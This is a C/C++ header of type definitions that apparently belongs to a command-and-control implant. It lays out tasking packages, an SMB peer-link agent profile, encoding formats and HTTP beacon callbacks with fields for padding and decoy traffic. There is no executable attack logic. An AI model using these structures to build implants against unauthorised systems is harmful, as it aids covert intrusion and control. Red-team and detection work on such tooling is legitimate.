#include <Win32.h>

#define KH_SOCKET_NEW   0
#define KH_SOCKET_DATA  1
#define KH_SOCKET_CLOSE 2

typedef struct {
    PVOID   Buffer;
    size_t  Length;
    size_t  Size;
    BOOL    Encrypt;
    CHAR*   TaskUUID;
} PACKAGE, *PPACKAGE;

typedef struct {
    PCHAR   Original;
    PCHAR   Buffer;
    UINT32  Size;
    UINT32  Length;
} PARSER, *PPARSER;

struct _SMB_PROFILE_DATA {
    CHAR* SmbUUID;
    CHAR* AgentUUID;
    
    HANDLE Handle;

    PACKAGE* Pkg;
    PARSER*  Psr;

    _SMB_PROFILE_DATA* Next;
};
typedef _SMB_PROFILE_DATA SMB_PROFILE_DATA;

enum class Base64Action {
    Get_Size,
    Encode,
    Decode
};

typedef enum class OutputFmt {
    Raw,
    Base32,
    Base64,
    Base64Url
};

typedef enum _OUTPUT_TYPE {
    Output_Parameter,
    Output_Header,
    Output_Body,
    Output_Format_Count
} OUTPUT_TYPE;

typedef struct _OUTPUT_FORMAT {
    OUTPUT_TYPE Type;

    union {
        struct {
            WCHAR* ParamName; 
        } Parameter;
        
        struct {
            WCHAR* HeaderName;
        } Header;
        
        struct {
            WCHAR* Content;
        } Body;
    } Config;

    PBYTE FalseBody;
    ULONG Flags;
} OUTPUT_FORMAT, *POUTPUT_FORMAT;

typedef struct _HTTP_ENDPOINT {
    WCHAR*         Path;
    OUTPUT_FORMAT  ServerOutput;
    OUTPUT_FORMAT  ClientOutput;
    
    PBYTE          AppendData;
    SIZE_T         AppendSize;
    PBYTE          PrependData;
    SIZE_T         PrependSize;
    
    WCHAR**        Parameters;
    ULONG          ParamCount;
} HTTP_ENDPOINT, *PHTTP_ENDPOINT;

typedef struct _HTTP_METHOD_ENDPOINTS {
    HTTP_ENDPOINT* Endpoints;      
    ULONG          EndpointCount;  

    WCHAR*         Headers;
    
    WCHAR**        Cookies;
    ULONG          CookiesCount;

    PBYTE          DoNothingBuff;
} HTTP_METHOD, *PHTTP_METHOD_ENDPOINTS;

typedef struct _HTTP_CALLBACKS {
    WCHAR*       Host;
    ULONG        Port;
    WCHAR*       UserAgent;
    
    HTTP_METHOD  Get;           // Endpoints GET
    HTTP_METHOD  Post;          // Endpoints POST
} HTTP_CALLBACKS, *PHTTP_CALLBACKS;